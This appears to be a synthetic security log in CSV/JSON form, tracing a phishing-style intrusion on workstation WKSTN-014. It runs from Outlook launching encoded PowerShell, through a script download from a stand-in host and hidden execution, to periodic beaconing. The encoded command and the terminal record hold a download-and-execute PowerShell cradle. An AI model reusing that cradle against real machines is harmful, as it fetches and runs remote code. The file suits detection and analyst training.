@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-11-01T09:12:01Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,outlook.exe,outlook.exe /recycle,,,,Process Create: Image=outlook.exe ParentImage=explorer.exe CommandLine=outlook.exe /recycle,"{""@timestamp"": ""2024-11-01T09:12:01Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Process Create: Image=outlook.exe ParentImage=explorer.exe CommandLine=outlook.exe /recycle"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""outlook.exe"", ""pid"": 2980, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""outlook.exe /recycle""}}"
2024-11-01T09:12:01Z,endpoint,process_start,WKSTN-014,10.10.14.23,jdoe,,,,,powershell.exe,powershell.exe -EncodedCommand SQBmACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHUAcABkAGEAdABlAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACIAKQA=,,,,Sysmon EventID=1 ProcessCreate Image=powershell.exe ParentImage=outlook.exe CommandLine=powershell.exe -EncodedCommand ...,"{""@timestamp"": ""2024-11-01T09:12:01Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Sysmon EventID=1 ProcessCreate Image=powershell.exe ParentImage=outlook.exe CommandLine=powershell.exe -EncodedCommand ..."", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 4120, ""parent"": {""name"": ""outlook.exe"", ""pid"": 2980}, ""command_line"": ""powershell.exe -EncodedCommand SQBmACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHUAcABkAGEAdABlAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACIAKQA=""}}"
2024-11-01T09:12:08Z,network,dns,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,,,,,,,,,DNS: query=malicious-update.com answer=185.234.218.71 ttl=60 src=10.10.14.23,"{""@timestamp"": ""2024-11-01T09:12:08Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=malicious-update.com answer=185.234.218.71 ttl=60 src=10.10.14.23"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""dns"": {""question"": {""name"": ""malicious-update.com""}, ""answers"": [{""data"": ""185.234.218.71"", ""ttl"": 60}]}}"
2024-11-01T09:12:10Z,network,http,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,185.234.218.71,80,http://malicious-update.com/update.ps1,,,,,,PROXY time=2024-11-01T09:12:10Z src=10.10.14.23 dst=185.234.218.71 method=GET url=http://malicious-update.com/update.ps1 status=200 ua='Mozilla/5.0...',"{""@timestamp"": ""2024-11-01T09:12:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY time=2024-11-01T09:12:10Z src=10.10.14.23 dst=185.234.218.71 method=GET url=http://malicious-update.com/update.ps1 status=200 ua='Mozilla/5.0...'"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""destination"": {""ip"": ""185.234.218.71"", ""port"": 80}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 4608}, ""http"": {""request"": {""method"": ""GET""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""http://malicious-update.com/update.ps1""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}}"
2024-11-01T09:12:12Z,endpoint,file_write,WKSTN-014,10.10.14.23,jdoe,,,,,,,C:\Users\jdoe\AppData\Roaming\update.ps1,3b9f1e2d9c8b9e0b4f7e2b88c91d5f7c3d0f1a2b3c4d5e6f7a8b9c0d1e2f,,EDR FileWrite path=C:\Users\jdoe\AppData\Roaming\update.ps1 sha256=...,"{""@timestamp"": ""2024-11-01T09:12:12Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR FileWrite path=C:\\Users\\jdoe\\AppData\\Roaming\\update.ps1 sha256=..."", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\jdoe\\AppData\\Roaming\\update.ps1"", ""hash"": {""sha256"": ""3b9f1e2d9c8b9e0b4f7e2b88c91d5f7c3d0f1a2b3c4d5e6f7a8b9c0d1e2f""}}}"
2024-11-01T09:12:14Z,terminal,command,WKSTN-014,10.10.14.23,jdoe,,,,,,,,,,"2024-11-01T09:12:14Z jdoe@WKSTN-014$ powershell -NoP -W Hidden -File $env:APPDATA\update.ps1
(no output)","{""@timestamp"": ""2024-11-01T09:12:14Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-01T09:12:14Z jdoe@WKSTN-014$ powershell -NoP -W Hidden -File $env:APPDATA\\update.ps1\n(no output)"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""terminal"": {""command"": ""powershell -NoP -W Hidden -File $env:APPDATA\\update.ps1"", ""output"": ""(no output)""}}"
2024-11-01T09:15:10Z,network,flow,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,185.234.218.71,443,,,,,,,FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s,"{""@timestamp"": ""2024-11-01T09:15:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""destination"": {""ip"": ""185.234.218.71"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 384}}"
2024-11-01T09:16:10Z,network,flow,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,185.234.218.71,443,,,,,,,FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s,"{""@timestamp"": ""2024-11-01T09:16:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""destination"": {""ip"": ""185.234.218.71"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 384}}"
2024-11-01T09:17:10Z,network,flow,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,185.234.218.71,443,,,,,,,FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s,"{""@timestamp"": ""2024-11-01T09:17:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""destination"": {""ip"": ""185.234.218.71"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 384}}"
2024-11-01T09:18:10Z,network,flow,WKSTN-014,10.10.14.23,jdoe,10.10.14.23,185.234.218.71,443,,,,,,,FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s,"{""@timestamp"": ""2024-11-01T09:18:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW src=10.10.14.23 dst=185.234.218.71:443 proto=tcp bytes_out=128 bytes_in=256 interval=~60s"", ""host"": {""name"": ""WKSTN-014"", ""ip"": [""10.10.14.23""]}, ""user"": {""name"": ""jdoe"", ""email"": null}, ""source"": {""ip"": ""10.10.14.23""}, ""destination"": {""ip"": ""185.234.218.71"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 384}}"
